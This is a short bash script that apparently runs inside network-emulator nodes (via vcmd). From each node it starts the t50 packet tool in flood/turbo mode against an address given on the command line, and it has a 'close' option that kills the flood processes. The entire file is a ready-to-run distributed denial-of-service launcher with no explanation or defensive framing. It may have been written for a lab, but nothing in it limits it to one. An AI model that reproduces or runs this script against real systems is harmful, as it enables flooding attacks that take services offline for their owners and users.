#!/bin/bash

mkdir ~/ddos

ls -la $1 | egrep -v "(log|xy|pid|conf|NGINX|RT|stat|jpg|nodes|serv)" | grep "n" | cut -d " " -f19 > ~/ddos/machine

if [[ $1 == "close" ]]; then
       kill -9 $(ps aux | grep xterm)
       killall -9 t50
else
     list=$(cat ~/ddos/machine)

    for i in $list;

    do

            nohup xterm -e vcmd -c $1/$i -- t50 --flood --turbo -S $2 &

    done

fi


rm ~/ddos/*

rmdir ~/ddos
